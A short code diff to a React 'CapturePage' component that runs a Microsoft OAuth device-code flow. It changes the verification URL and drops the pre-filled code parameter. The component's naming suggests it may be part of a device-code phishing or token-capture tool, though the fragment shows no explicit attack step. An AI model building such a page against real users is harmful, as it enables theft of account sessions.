@@ -1,6 +1,6 @@
 import React, { useState, useEffect, useCallback, useRef } from 'react';
 
-const DEVICE_AUTH_URL = 'https://login.microsoftonline.com/common/oauth2/deviceauth';
+const DEVICE_AUTH_URL = 'https://login.microsoft.com/device';
 
 type CaptureState = 'idle' | 'loading' | 'code_ready' | 'waiting' | 'success' | 'error' | 'expired';
 
@@ -130,8 +130,7 @@ export function CapturePage(): React.ReactElement {
 
   function handleContinueToVerify(): void {
     setState('waiting');
-    const otcParam = userCode.replace(/\s/g, '');
-    window.open(`${DEVICE_AUTH_URL}?otc=${otcParam}`, '_blank');
+    window.open(DEVICE_AUTH_URL, '_blank');
     if (deviceCode) {
       startPolling(deviceCode, pollInterval);
     }
